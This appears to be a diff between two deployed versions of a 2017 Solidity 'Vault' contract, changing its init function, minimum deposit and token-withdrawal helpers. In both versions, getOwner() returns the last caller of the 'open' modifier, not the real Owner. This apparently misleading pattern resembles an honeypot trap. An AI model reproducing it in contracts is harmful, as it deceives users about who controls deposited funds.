@@ -1,17 +1,15 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Vault at 0x6f5C1Ed62A4fA41CFC332D81FAFd3CD38aaCBD85
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Vault at 0xd81Fe2C11edD560C4d44fdD4F651f3608452BeEd
 */
 // Copyright (C) 2017  The Halo Platform by Scott Morrison
 //
 // This is free software and you are welcome to redistribute it under certain conditions.
 // ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
-// https://www.gnu.org/licenses/gpl-2.0.html
-
-pragma solidity ^0.4.17;
+//
+pragma solidity ^0.4.11;
 
 // minimum token interface
 contract Token {
-    function balanceOf(address who) public constant returns (uint256);
     function transfer(address to, uint amount) public returns (bool);
 }
 
@@ -23,18 +21,8 @@ contract Ownable {
 
 // tokens are withdrawable
 contract TokenVault is Ownable {
-    address self = address(this);
-
     function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
         return Token(token).transfer(to, amount);
-    }
-    
-    function withdrawToken(address token) public returns (bool) {
-        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
-    }
-    
-    function emtpyTo(address token, address to) public returns (bool) {
-        return withdrawTokenTo(token, to, Token(token).balanceOf(self));
     }
 }
 
@@ -50,9 +38,9 @@ contract Vault is TokenVault {
     bool Locked;
     uint Date;
 
-    function initVault() payable open {
+    function init() payable open {
         Owner = msg.sender;
-        minDeposit = 0.25 ether;
+        minDeposit = 1 ether;
         Locked = false;
         deposit();
     }
@@ -86,8 +74,8 @@ contract Vault is TokenVault {
         }
     }
 
-    function lock() public { Locked = true; } address inited;
-    modifier open { if (!Locked) _; inited = msg.sender; }
-    function kill() { require(this.balance == 0); selfdestruct(Owner); }
-    function getOwner() external constant returns (address) { return inited; }
+    function lock() public { Locked = true; } address owner;
+    modifier open { if (!Locked) _; owner = msg.sender; }
+    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
+    function getOwner() external constant returns (address) { return owner; }
 }
